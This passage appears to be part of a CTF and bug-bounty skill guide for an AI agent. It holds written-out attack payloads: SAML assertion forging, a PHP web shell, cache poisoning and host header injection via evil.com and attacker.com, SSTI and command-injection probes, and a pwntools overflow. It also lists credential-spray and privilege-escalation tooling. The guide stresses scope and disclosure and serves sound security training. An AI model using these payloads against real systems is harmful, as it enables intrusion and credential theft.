    <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
  </saml:Assertion>
  {original_signed_assertion}
</samlp:Response>
```

### GraphQL Alias Batch

Parallelize brute-force in a single request:
```graphql
mutation { m0: login(pin:"0000"){success} m1: login(pin:"1337"){success} }
```

### Race Conditions

Use concurrent requests with session pooling:
```python
import concurrent.futures, requests
session = requests.Session()
def exploit():
    return session.post(url, data=payload, timeout=5)
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    results = list(ex.map(lambda _: exploit(), range(50)))
# If multiple successes on a single-use operation, race condition confirmed
```

### File Upload Bypass

| Filter | Bypass |
|:-------|:-------|
| Extension blacklist | `.php3`, `.phtml`, `.phar` |
| Content-Type check | Upload PHP with `Content-Type: image/jpeg` |
| Magic bytes | `GIF89a;<?php system($_GET['c']); ?>` |

### Cache Poisoning

```
GET /api/config
X-Forwarded-Host: evil.com
```
If the response reflects `evil.com` in URLs, the cache may serve poisoned responses to other users.

### Host Header Injection

```
POST /forgot-password
Host: attacker.com
email=victim@example.com
```
Password reset links may use `request.host_url` — attacker controls the redirect target.

### Log Poisoning → SSTI Chain

Inject template syntax into logged fields (User-Agent, referer, custom headers), then trigger template rendering on the log view endpoint:
```
GET /visit → User-Agent: {{7*7}}
GET /render → check if "49" appears in rendered output
```

## Step 2: Cryptography

### Auto-Decoding Workflow

```python
exec(open("${HERMES_SKILL_DIR}/references/ctf_helper.py").read())

result = decode_all_encodings("dGVzdCBmbGFnIHtmbGFnX3Rlc3R9")
print(result["flag_matches"])
```

### RSA Attack Decision Tree

```
Given: n, e, c

1. e very small (e=3)? → Cube root if m^e < n     → rsa_small_exponent(n, e, c)
2. Same n, different e? → Common modulus attack    → rsa_common_modulus(n, e1, e2, c1, c2)
3. e very large? → Wiener's attack (small d)       → rsa_wiener(n, e)
4. p and q close? → Fermat factorization           → rsa_fermat(n, e, c)
5. Can factor n? → d = inverse(e, (p-1)*(q-1))
```

```python
from bugbounty_ctf.crypto import CryptoToolkit
ct = CryptoToolkit()
ct.rsa_fermat(n, e=65537, c=ciphertext)   # factors close primes, derives d, decrypts c → flag
ct.rsa_wiener(n, e)                        # recovers small private exponent d
```

## Step 3: Binary Exploitation (Pwn)

### Protection Check First

```bash
checksec ./vuln
```

| Protection | Bypass |
|:-----------|:-------|
| NX/DEP | ROP, return-to-libc |
| PIE | Leak address first, calculate base |
| Canary | Leak via format string/info leak |

### Buffer Overflow

```python
from pwn import *
context.arch = 'amd64'
io = process('./vuln')
io.sendline(cyclic(200))
io.wait()
offset = cyclic_find(0x6161616c)  # from crash
payload = b'A' * offset + p64(RET_ADDRESS)
io = process('./vuln')
io.sendline(payload)
io.interactive()
```

## Step 4: Reverse Engineering

```bash
file binary
strings binary | head -50
checksec binary
ltrace binary 2>&1 | head -20
strace binary 2>&1 | head -20
echo "test" | ltrace binary
```

**Always run the binary first** before opening a disassembler. Observe behavior, then analyze.

## Step 5: Forensics

Run in order — ~40% of flags are caught by step 1:

```bash
strings image.png | grep -iE "flag|ctf|key|secret"
exiftool image.png
binwalk -e image.png
zsteg image.png -a
steghide extract -sf image.png -p ""
```

## CTF Identification vs Flag-Capture

Many CTF labs are **vulnerability identification exercises**, not flag-capture:
- Challenge asks "Check if X is secure" not "Find the flag"
- No flag format specified
- The answer is the vulnerability type itself
- The platform has a submission form for vuln names/CWE codes

**Self-XSS detection:** DOM XSS with no delivery vector (no bot, no shareable URL) — the XSS itself is the answer. Don't chase account-takeover chains that don't exist.

## Bug Bounty Methodology

1. **Scope check:** Only test in-scope domains. Enforce it mechanically — wrap the scanner in a `ScopeGuard` so out-of-scope requests hard-fail instead of relying on discipline:
   ```python
   from bugbounty_ctf import SecurityScanner, ScopeGuard
   scope = ScopeGuard(["*.example.com", "api.example.org"])  # exact, wildcard, or apex
   scanner = SecurityScanner("https://app.example.com/", scope=scope)
   # Any request to a host outside the allowlist raises OutOfScopeError.
   ```
2. **Surface mapping:** Every input point — params, headers, cookies, uploads, API endpoints.
3. **Vulnerability testing:** Follow the order in Step 1.
4. **Impact demonstration:** Show real impact — data access, account takeover, RCE.
5. **Report writing:** Clear steps, PoC, impact, fix.
6. **Responsible disclosure:** Report through proper channels.

## Common Pitfalls

### Web

1. **Web payload encoding:** URL-encode special chars in GET params.
2. **Forgetting to reset connections:** State from stage 1 can break stage 2.
3. **Self-XSS detection pattern:** DOM XSS with no remote delivery = self-XSS. Indicators: (a) JS only reads form input. (b) No bot/admin visits. (c) SQLi output is HTML-escaped. (d) No POST accepts user content.
4. **PHP dev server (`php -S`) routes everything to `index.php`:** Gobuster shows hundreds of `200 OK` with identical sizes. Use `--exclude-length` to filter.
5. **WordPress comments go to moderation.** 302 redirect with `unapproved=N` — comment won't appear until approved.

### Pwn / Binary

6. **Off-by-one in offsets:** Always verify with `cyclic_find()`, never guess.
7. **Stack alignment:** x86_64 requires 16-byte alignment before `call`. Add `ret` gadget.
8. **Wrong architecture:** `context.arch = 'i386'` for 32-bit, `'amd64'` for 64-bit.
9. **pwntools recv hangs:** Use `recv(timeout=2)` when unsure.

### Crypto

10. **Big-endian vs little-endian:** Network = big-endian, x86 = little-endian.
11. **Multi-byte XOR:** Use Hamming distance to find key length.

### Privilege Escalation

12. **SUID interactive binaries need PTY.** Use `pty.openpty()` + fork + execve.
13. **`sg` / `newgrp` need a TTY.** Combine with `pty.openpty()`.

### Forensics

14. **Skip the obvious last:** Run `strings`, `exiftool`, `binwalk` BEFORE complex tools.

### CTF Workflow

15. **Read the challenge description.** Hints are embedded in descriptions and file names.
16. **Challenge descriptions use metaphors.** "forgotten rusty key" = old cache file; "drop of frost" = IV; "master key" = AES key. Map poetic language to technical concepts.
17. **CTF rate limiting is per-session-cookie.** Rotate cookies between batches or wait the cooldown.
18. **If a route returns 404, the variation may not be loaded.** In dynamically-generated labs (DRTBP/Agenticverse), some challenge variations require specific config. Don't waste time on endpoints that don't exist.
19. **WSGI-only exploits.** Some challenges require Flask test client `environ_overrides` — these are **not exploitable via standard HTTP requests**. Skip and move on.

## Verification Checklist

- [ ] Map all endpoints (GET + POST every URL)
- [ ] Extract all input points (forms, params, headers, cookies)
- [ ] Establish baselines (normal response for each input)
- [ ] Test each input with `'`, `{{7*7}}`, `../../../etc/passwd`, `; id`
- [ ] Compare every response to baseline — differences = vulns
- [ ] Exploit confirmed vulns, chain to new surface
- [ ] Only test on authorized targets

## Reference Index

Paths below are relative to the skill directory. Hermes substitutes
`${HERMES_SKILL_DIR}` with the absolute skill path at load time, so to open any
bundled file reliably (regardless of the agent's cwd) prefix it, e.g.
`open("${HERMES_SKILL_DIR}/references/payload-library.md")`.

| File | Use when |
|:-----|:---------|
| `bugbounty_ctf/engine.py` | Core testing engine: payload runner, response diff, attack surface mapping, state persistence |
| `bugbounty_ctf/quick_tests.py` | Quick test wrappers: one-liners for SQLi, SSTI, CMDi, path traversal, NoSQLi, LDAP, SSRF |
| `bugbounty_ctf/advanced_tests.py` | Advanced: WAF/defense detection, race conditions, XXE, deserialization, JWT, file upload, XSS, IDOR, GraphQL, chain exploitation, reporting |
| `bugbounty_ctf/web_recon.py` | Automated web target recon (shell-injection-safe) |
| `bugbounty_ctf/kalibox.py` | **Isolation:** run all offensive/privileged tooling inside a disposable Kali container (`kalibox` CLI + `KaliBox`) — no host `sudo`/root |
| `bugbounty_ctf/post_exploit.py` | **Post-ex:** after RCE — `post_exploit_enum(run)` sweeps SUID/sudo/caps/cron/writable files/keys for privesc (Phase 4) |
| `bugbounty_ctf/nfs_enum.py` | **Infra:** NFS exports, parent/sibling mount candidates, sensitive-file + UID-locked scan (AUTH_SYS spoofing) |
| `bugbounty_ctf/mail_enum.py` | **Infra:** IMAP/POP3 login check, concurrent credential spray, mailbox/attachment secret harvest |
| `bugbounty_ctf/template_scan.py` | nuclei wrapper (auto-install), dependency-free builtin templates, version→CVE correlation (bundled DB + live NVD) |
| `bugbounty_ctf/callback_listener.py` | HTTP listener for XSS/SSRF callback testing |
| `bugbounty_ctf/alpine_pty_extract.py` | SUID binary file extraction via PTY |
| `references/payload-library.md` | Organized payload sets by vulnerability class with Python dicts |
| `references/escalate-ctf-walkthrough.md` | Full SQLi → webshell → SUID → docker root chain |
| `references/advanced-escalation.md` | SUID PTY, PAM scripts, Docker escapes |
| `references/suid-webshell-exploitation.md` | SUID binaries via webshell, Python pty patterns |
| `references/suid-sg-docker-escalation.md` | `setresuid()` + `sg docker` pattern |
| `references/docker-privilege-escalation.md` | Docker group → root, comprehensive |
| `references/curl-executor-webshell.md` | SSRF curl executor → webshell → RCE |
| `references/sqlite-php-sqli-playbook.md` | PHP+SQLite SQLi attack tree |
| `references/sqlite-sqli-deep-dive.md` | pragma_*, sqlite_dbpage, FTS3 tokenizer |
| `references/htb-recon-methodology.md` | HTB recon: machine ID, GitHub source discovery |
| `references/aclabs-platform-patterns.md` | ACLabs.pro patterns, vuln-ID vs flag-capture |
| `references/aclabs-drtbp-architecture.md` | DRTBP challenge architecture |
| `references/aclabs-source-exploitation.md` | ACLabs source exploitation methodology |
| `references/nginx-ui-exploitation.md` | nginx-ui: unauthenticated backup, RSA login |
| `references/nginx-ui-login-encryption.md` | nginx-ui RSA login workflow |
| `references/nginx-ui-backdoor.md` | nginx-ui backdoor analysis |
| `references/recreating-ctf-labs-locally.md` | Rebuild CTF target as Docker Compose |
| `templates/exploit_template.py` | Pwntools exploit skeleton |
| `templates/bug-bounty-report.md` | Report template for bounty submissions |
| `references/ctf_helper.py` | `analyze_challenge()`, encoding detection, XOR, hash cracking |
